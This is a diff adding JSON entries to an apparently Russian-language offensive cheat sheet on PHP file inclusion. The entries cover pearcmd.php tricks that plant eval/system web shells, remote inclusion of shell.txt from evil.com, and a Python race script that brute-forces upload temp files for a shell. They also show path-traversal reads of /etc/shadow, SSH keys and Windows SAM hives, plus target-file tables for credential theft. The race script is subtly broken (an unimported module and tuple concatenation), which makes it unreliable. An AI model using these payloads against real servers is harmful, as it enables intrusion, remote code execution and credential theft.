+      "body": "# pearcmd.php установлен по умолчанию в каждом Docker-образе php\n# в /usr/local/lib/php/pearcmd.php; нужен register_argc_argv=On\n\n# Method 1: config-create\n/vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php\n/vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();\n\n# Method 2: man_dir\n/vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+\n/vuln.php?file=/tmp/exec.php&c=id\n\n# Method 3: download (нужен доступ в сеть)\n/vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php\n/vuln.php?file=exec.php&c=id\n\n# Method 4: install (нужен доступ в сеть); exec.php → /tmp/pear/download/exec.php\n/vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php\n/vuln.php?file=/tmp/pear/download/exec.php&c=id"
+    },
+
+    {
+      "subcategory": "LFI → RCE: upload",
+      "title": "Self-inclusion загруженного файла",
+      "language": "text",
+      "tags": ["lfi", "rce", "upload"],
+      "body": "# если можно загрузить файл — внедри в него шелл (e.g. <?php system($_GET['c']); ?>)\n# чтобы файл остался валидным, прячь код в метаданные картинки/doc/pdf\nhttp://example.com/index.php?page=path/to/uploaded/file.png"
+    },
+    {
+      "subcategory": "LFI → RCE: upload",
+      "title": "Race condition — брутфорс /tmp/php* во время загрузки",
+      "language": "python",
+      "tags": ["lfi", "rce", "upload", "race"],
+      "body": "import itertools\nimport requests\nimport sys\n\nprint('[+] Trying to win the race')\nf = {'file': open('shell.php', 'rb')}\nfor _ in range(4096 * 4096):\n    requests.post('http://target.com/index.php?c=index.php', f)\n\n\nprint('[+] Bruteforcing the inclusion')\nfor fname in itertools.combinations(string.ascii_letters + string.digits, 6):\n    url = 'http://target.com/index.php?c=/tmp/php' + fname\n    r = requests.get(url)\n    if 'load average' in r.text:  # <?php echo system('uptime');\n        print('[+] We have got a shell: ' + url)\n        sys.exit(0)\n\nprint('[x] Something went wrong, please try again')"
+    },
+    {
+      "subcategory": "LFI → RCE: upload",
+      "title": "Windows FindFirstFile — wildcard для temp-файла",
+      "language": "text",
+      "tags": ["lfi", "rce", "upload", "windows"],
+      "body": "# Только Windows. FindFirstFile разрешает маски в путях LFI:\n#   << как *   (любая последовательность символов)\n#   >  как ?   (один символ)\n# Загруженный файл попадает в C:\\Windows\\Temp\\ с именем php[A-F0-9]{4}.tmp.\n# Брутфорсить 65536 имён или использовать wildcard:\nhttp://site/vuln.php?inc=c:\\windows\\temp\\php<<"
+    },
+    {
+      "subcategory": "LFI → RCE: upload",
+      "title": "phpinfo() — слив имени temp-файла загрузки",
+      "language": "text",
+      "tags": ["lfi", "rce", "phpinfo"],
+      "body": "phpinfo() показывает содержимое $_GET, $_POST и $_FILES. Делая множество upload-запросов к скрипту с phpinfo() и аккуратно читая ответ, можно вытащить имя временного файла и успеть подключить его через LFI до удаления.\nСкрипт: phpInfoLFI.py (PayloadsAllTheThings/File Inclusion/Files/phpinfolfi.py)."
+    },
+    {
+      "subcategory": "LFI → RCE: iconv (CVE-2024-2961)",
+      "title": "iconv OOB в glibc → RCE (cnext)",
+      "language": "text",
+      "tags": ["lfi", "rce", "iconv", "cve"],
+      "body": "Через wrapper iconv триггерится OOB в glibc (CVE-2024-2961), затем LFI читает /proc/self/maps и скачивает бинарь glibc. RCE достигается эксплуатацией структуры zend_mm_heap: free() ремапится на system через custom_heap._free.\nТребования:\n• PHP 7.0.0 (2015) – 8.3.7 (2024)\n• glibc <= 2.39\n• доступ к фильтрам convert.iconv, zlib.inflate, dechunk\nЭксплойт: ambionics/cnext-exploits."
+    },
+
+    {
+      "subcategory": "RFI",
+      "title": "Remote File Inclusion — базовое включение по URL",
+      "language": "text",
+      "tags": ["rfi", "rce"],
+      "body": "# не работает по умолчанию: с PHP 5 allow_url_include выключен.\n# Большинство обходов фильтров из LFI применимы и к RFI.\nhttp://example.com/index.php?page=http://evil.com/shell.txt"
+    },
+    {
+      "subcategory": "RFI",
+      "title": "RFI — включить allow_url_include",
+      "language": "text",
+      "tags": ["rfi", "config"],
+      "body": "allow_url_include = On"
+    },
+    {
+      "subcategory": "RFI",
+      "title": "RFI — Null Byte и Double Encoding",
+      "language": "text",
+      "tags": ["rfi", "null-byte", "double-encoding", "bypass"],
+      "body": "http://example.com/index.php?page=http://evil.com/shell.txt%00\nhttp://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt"
+    },
+    {
+      "subcategory": "RFI",
+      "title": "Обход allow_url_include через SMB (Windows)",
+      "language": "text",
+      "tags": ["rfi", "smb", "windows", "bypass"],
+      "body": "Когда allow_url_include и allow_url_fopen = Off, на Windows всё ещё можно подключить удалённый файл по smb:\n1. Создать общую папку, открытую для всех.\n2. Записать PHP-код в файл shell.php.\n3. Подключить:\nhttp://example.com/index.php?page=\\\\10.0.0.1\\share\\shell.php"
+    },
+
+    {
+      "subcategory": "LFI → RCE: чтение учёток",
+      "title": "Linux — /etc/shadow и приватные SSH-ключи",
+      "language": "text",
+      "tags": ["lfi", "credentials", "linux"],
+      "body": "# извлечь /etc/shadow и сбрутить хеши → вход по SSH\nhttp://example.com/index.php?page=../../../../../../etc/shadow\n# либо прочитать приватный ключ: определи юзера по /etc/passwd,\n# затем читай /<HOME>/.ssh/id_rsa для каждого пользователя с домашним каталогом"
+    },
+    {
+      "subcategory": "LFI → RCE: чтение учёток",
+      "title": "Windows — SAM и SYSTEM для извлечения хешей",
+      "language": "text",
+      "tags": ["lfi", "credentials", "windows"],
+      "body": "http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam\nhttp://example.com/index.php?page=../../../../../../WINDOWS/repair/system\n# затем: samdump2 SYSTEM SAM > hashes.txt → крек hashcat/john или Pass-The-Hash"
+    },
+
+    {
+      "subcategory": "Интересные файлы (Linux)",
+      "title": "Linux — приоритетные файлы для LFI",
+      "language": "table",
+      "tags": ["lfi", "linux", "wordlist"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Путь", "Что даёт"],
+          "rows": [
+            ["/etc/passwd", "список пользователей, домашние каталоги, проверка LFI"],
+            ["/etc/shadow", "хеши паролей (нужны привилегии)"],
+            ["/etc/hosts", "локальные хосты"],
+            ["/etc/issue, /etc/motd", "баннер ОС"],
+            ["/proc/self/environ", "переменные окружения процесса (log poisoning)"],
+            ["/proc/version, /proc/cmdline", "версия ядра, аргументы загрузки"],
+            ["/root/.bash_history", "история команд root"],
+            ["/root/.ssh/id_rsa", "приватный SSH-ключ root"],
+            ["/etc/apache2/apache2.conf", "конфиг Apache"],
+            ["/etc/httpd/conf/httpd.conf", "конфиг Apache (RHEL)"],
+            ["/etc/nginx.conf, /usr/local/nginx/conf/nginx.conf", "конфиг nginx"],
+            ["/etc/mysql/my.cnf", "конфиг MySQL"],
+            ["/var/log/apache2/access.log", "лог Apache (log poisoning)"],
+            ["/var/log/nginx/access.log", "лог nginx (log poisoning)"],
+            ["/var/log/auth.log", "лог SSH-аутентификации (log poisoning)"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Интересные файлы (Windows)",
+      "title": "Windows — приоритетные файлы для LFI",
+      "language": "table",
+      "tags": ["lfi", "windows", "wordlist"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Путь", "Что даёт"],
+          "rows": [
+            ["C:\\boot.ini", "классическая проверка LFI"],
+            ["C:\\windows\\win.ini", "проверка LFI"],
+            ["C:\\windows\\system.ini", "проверка LFI"],
+            ["C:\\windows\\system32\\drivers\\etc\\hosts", "файл hosts"],
+            ["C:\\windows\\repair\\sam", "хеши паролей (SAM)"],
+            ["C:\\windows\\repair\\system", "ключ SYSTEM для расшифровки SAM"],
+            ["C:\\windows\\system32\\config\\sam", "база SAM (обычно заблокирована)"],
+            ["C:\\windows\\system32\\config\\regback\\sam", "резервная копия SAM"],
+            ["C:\\windows\\php.ini, C:\\php\\php.ini", "конфиг PHP, пути сессий"],
+            ["C:\\inetpub\\wwwroot\\web.config", "конфиг IIS-приложения"],
+            ["C:\\windows\\system32\\inetsrv\\config\\applicationhost.config", "конфиг IIS"],
+            ["C:\\xampp\\apache\\logs\\access.log", "лог Apache XAMPP (log poisoning)"],
+            ["C:\\xampp\\apache\\conf\\httpd.conf", "конфиг Apache XAMPP"],
+            ["C:\\xampp\\phpmyadmin\\config.inc.php", "учётка БД phpMyAdmin"],
+            ["C:\\program files\\mysql\\my.ini", "конфиг MySQL"],
+            ["C:\\windows\\panther\\unattend.xml", "файл автоустановки (учётки)"],
+            ["C:\\sysprep\\sysprep.xml", "файл sysprep (учётки)"]
+          ]
+        }
+      }
+    }
+  ]
+}
